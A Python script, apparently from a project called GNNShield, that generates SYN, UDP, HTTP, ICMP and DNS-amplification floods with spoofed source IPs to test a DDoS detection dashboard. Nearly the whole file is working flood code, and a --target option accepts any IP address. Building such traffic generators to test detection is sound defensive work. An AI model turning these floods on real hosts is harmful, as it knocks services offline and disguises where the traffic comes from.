"""
ddos_traffic_simulator.py — DDoS Attack Simulator
===================================================
Simulates different DDoS attack types on the local machine
for testing the detection dashboard.

IMPORTANT: Run as Administrator (required for Layer 2 raw packet injection)
IMPORTANT: Only use on your own machine for testing purposes

Usage:
    python ddos_traffic_simulator.py                        # interactive menu
    python ddos_traffic_simulator.py --attack syn           # SYN Flood
    python ddos_traffic_simulator.py --attack udp           # UDP Flood
    python ddos_traffic_simulator.py --attack http          # HTTP Flood
    python ddos_traffic_simulator.py --attack icmp          # ICMP Flood
    python ddos_traffic_simulator.py --attack dns           # DNS Amplification
    python ddos_traffic_simulator.py --attack all           # cycle all types
    python ddos_traffic_simulator.py --attack syn --duration 60 --target 192.168.1.5
"""

import os
import sys
import time
import random
import socket
import argparse
import threading
from typing import Optional

# ─── Admin check ─────────────────────────────────────────────────────────────
if os.name == "nt":
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("ERROR: This script must be run as Administrator.")
        print("Right-click Command Prompt → 'Run as administrator'")
        sys.exit(1)


def _get_local_ip_and_iface():
    """Detect the active local IP and matching Scapy interface."""
    try:
        from scapy.all import conf
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        for iface_name in conf.ifaces:
            if conf.ifaces[iface_name].ip == ip:
                return ip, iface_name
        return ip, str(conf.iface)
    except Exception:
        return "127.0.0.1", "lo"


# ─── Attack Simulators ────────────────────────────────────────────────────────

class DDoSSimulator:

    def __init__(self, target_ip: Optional[str] = None, interface: Optional[str] = None):
        from scapy.all import conf, get_if_hwaddr

        detected_ip, detected_iface = _get_local_ip_and_iface()
        self.target_ip  = target_ip or detected_ip
        self.interface  = interface or detected_iface
        self.packet_count = 0
        self._running   = False
        conf.verb       = 0

        try:
            self.local_mac = get_if_hwaddr(self.interface)
        except Exception:
            self.local_mac = "ff:ff:ff:ff:ff:ff"

        print(f"\n  Target IP  : {self.target_ip}")
        print(f"  Interface  : {self.interface}")
        print(f"  Local MAC  : {self.local_mac}\n")

    def stop(self):
        self._running = False

    # ── SYN Flood ─────────────────────────────────────────────────────────────
    def syn_flood(self, duration: int = 30, port: int = 80):
        """TCP SYN flood with spoofed source IPs (Layer 2)."""
        from scapy.all import Ether, IP, TCP, RandShort, sendp

        print(f"  🚨 SYN Flood → {self.target_ip}:{port}  ({duration}s)")
        self._running   = True
        self.packet_count = 0
        t_end = time.time() + duration

        while self._running and time.time() < t_end:
            src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            pkt = (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip) /
                TCP(sport=RandShort(), dport=port, flags="S", seq=random.randint(0, 2**32))
            )
            sendp(pkt, iface=self.interface, verbose=0)
            self.packet_count += 1
            if self.packet_count % 200 == 0:
                print(f"\r  Packets sent: {self.packet_count}", end="", flush=True)

        print(f"\r  ✓ SYN Flood complete: {self.packet_count} packets\n")

    # ── UDP Flood ─────────────────────────────────────────────────────────────
    def udp_flood(self, duration: int = 30, port: int = 53):
        """UDP flood with random payloads."""
        from scapy.all import Ether, IP, UDP, Raw, sendp

        print(f"  🚨 UDP Flood → {self.target_ip}:{port}  ({duration}s)")
        self._running   = True
        self.packet_count = 0
        t_end = time.time() + duration

        while self._running and time.time() < t_end:
            src_ip  = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
            payload = random.randbytes(random.randint(64, 512))
            pkt = (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip) /
                UDP(sport=random.randint(1024, 65535), dport=port) /
                Raw(load=payload)
            )
            sendp(pkt, iface=self.interface, verbose=0)
            self.packet_count += 1
            if self.packet_count % 200 == 0:
                print(f"\r  Packets sent: {self.packet_count}", end="", flush=True)

        print(f"\r  ✓ UDP Flood complete: {self.packet_count} packets\n")

    # ── HTTP Flood ────────────────────────────────────────────────────────────
    def http_flood(self, duration: int = 30, port: int = 80):
        """HTTP GET flood over TCP (Layer 2) with spoofed IPs."""
        from scapy.all import Ether, IP, TCP, Raw, sendp

        print(f"  🚨 HTTP Flood → {self.target_ip}:{port}  ({duration}s)")
        self._running   = True
        self.packet_count = 0
        t_end = time.time() + duration

        paths = ["/", "/index.html", "/api/data", "/login", "/search?q=test"]
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "curl/7.88.1",
        ]

        while self._running and time.time() < t_end:
            src_ip  = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
            path    = random.choice(paths)
            agent   = random.choice(agents)
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: {agent}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()

            pkt = (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip) /
                TCP(sport=random.randint(1024, 65535), dport=port, flags="PA") /
                Raw(load=payload)
            )
            sendp(pkt, iface=self.interface, verbose=0)
            self.packet_count += 1
            if self.packet_count % 200 == 0:
                print(f"\r  Packets sent: {self.packet_count}", end="", flush=True)

        print(f"\r  ✓ HTTP Flood complete: {self.packet_count} packets\n")

    # ── ICMP Flood ────────────────────────────────────────────────────────────
    def icmp_flood(self, duration: int = 30):
        """ICMP echo request flood (ping flood)."""
        from scapy.all import Ether, IP, ICMP, Raw, sendp

        print(f"  🚨 ICMP Flood → {self.target_ip}  ({duration}s)")
        self._running   = True
        self.packet_count = 0
        t_end = time.time() + duration

        while self._running and time.time() < t_end:
            src_ip  = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            payload = random.randbytes(56)
            pkt = (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip) /
                ICMP(type=8, code=0) /
                Raw(load=payload)
            )
            sendp(pkt, iface=self.interface, verbose=0)
            self.packet_count += 1
            if self.packet_count % 200 == 0:
                print(f"\r  Packets sent: {self.packet_count}", end="", flush=True)

        print(f"\r  ✓ ICMP Flood complete: {self.packet_count} packets\n")

    # ── DNS Amplification ─────────────────────────────────────────────────────
    def dns_amplification(self, duration: int = 30):
        """Simulates DNS amplification — large UDP packets to port 53."""
        from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp

        print(f"  🚨 DNS Amplification → {self.target_ip}:53  ({duration}s)")
        self._running   = True
        self.packet_count = 0
        t_end = time.time() + duration

        domains = ["google.com", "cloudflare.com", "amazon.com", "microsoft.com"]

        while self._running and time.time() < t_end:
            src_ip = f"8.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            domain = random.choice(domains)
            pkt = (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip) /
                UDP(sport=random.randint(1024, 65535), dport=53) /
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
            )
            sendp(pkt, iface=self.interface, verbose=0)
            self.packet_count += 1
            if self.packet_count % 200 == 0:
                print(f"\r  Packets sent: {self.packet_count}", end="", flush=True)

        print(f"\r  ✓ DNS Amplification complete: {self.packet_count} packets\n")

    # ── Cycle all attacks ─────────────────────────────────────────────────────
    def cycle_all(self, duration_each: int = 20):
        """Run all 5 attack types in sequence."""
        attacks = [
            ("SYN Flood",        lambda: self.syn_flood(duration_each)),
            ("UDP Flood",        lambda: self.udp_flood(duration_each)),
            ("HTTP Flood",       lambda: self.http_flood(duration_each)),
            ("ICMP Flood",       lambda: self.icmp_flood(duration_each)),
            ("DNS Amplification",lambda: self.dns_amplification(duration_each)),
        ]
        total = len(attacks) * duration_each
        print(f"\n  Cycling all 5 attack types ({duration_each}s each — {total}s total)\n")
        for name, fn in attacks:
            if not self._running:
                break
            print(f"  ── {name} ──")
            self._running = True
            fn()
            print(f"  Pausing 3s before next attack…\n")
            time.sleep(3)


# ─── Interactive Menu ─────────────────────────────────────────────────────────

def interactive_menu(sim: DDoSSimulator):
    attacks = {
        "1": ("SYN Flood",         sim.syn_flood),
        "2": ("UDP Flood",         sim.udp_flood),
        "3": ("HTTP Flood",        sim.http_flood),
        "4": ("ICMP Flood",        sim.icmp_flood),
        "5": ("DNS Amplification", sim.dns_amplification),
        "6": ("Cycle All",         sim.cycle_all),
    }

    while True:
        print("\n" + "="*50)
        print("  GNNShield — DDoS Attack Simulator")
        print("="*50)
        for k, (name, _) in attacks.items():
            print(f"  {k}. {name}")
        print("  0. Exit")
        print("="*50)

        choice = input("  Select attack type: ").strip()
        if choice == "0":
            print("  Exiting simulator.")
            break
        if choice not in attacks:
            print("  Invalid choice.")
            continue

        name, fn = attacks[choice]
        try:
            duration = int(input(f"  Duration in seconds [{30}]: ").strip() or "30")
        except ValueError:
            duration = 30

        print(f"\n  Starting {name} for {duration}s…")
        print("  Press Ctrl+C to stop early.\n")

        sim._running = True
        try:
            if choice == "6":
                fn(duration_each=duration)
            else:
                fn(duration=duration)
        except KeyboardInterrupt:
            sim.stop()
            print(f"\n\n  Stopped. Total packets sent: {sim.packet_count}")


# ─── CLI ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="GNNShield DDoS Simulator — for testing detection dashboard",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--attack",   default=None,
                        choices=["syn","udp","http","icmp","dns","all"],
                        help="Attack type to run. Omit for interactive menu.")
    parser.add_argument("--target",   default=None,   help="Target IP (default: your local IP)")
    parser.add_argument("--iface",    default=None,   help="Network interface (default: auto-detect)")
    parser.add_argument("--duration", default=30, type=int, help="Duration in seconds")
    parser.add_argument("--port",     default=None, type=int, help="Target port (attack-specific default if omitted)")
    args = parser.parse_args()

    print("\n" + "="*50)
    print("  GNNShield — DDoS Traffic Simulator")
    print("  For testing detection accuracy only.")
    print("="*50)

    sim = DDoSSimulator(target_ip=args.target, interface=args.iface)

    try:
        if args.attack is None:
            interactive_menu(sim)
        elif args.attack == "syn":
            sim.syn_flood(duration=args.duration, port=args.port or 80)
        elif args.attack == "udp":
            sim.udp_flood(duration=args.duration, port=args.port or 53)
        elif args.attack == "http":
            sim.http_flood(duration=args.duration, port=args.port or 80)
        elif args.attack == "icmp":
            sim.icmp_flood(duration=args.duration)
        elif args.attack == "dns":
            sim.dns_amplification(duration=args.duration)
        elif args.attack == "all":
            sim._running = True
            sim.cycle_all(duration_each=args.duration)

    except KeyboardInterrupt:
        sim.stop()
        print(f"\n  Stopped. Total packets sent: {sim.packet_count}")
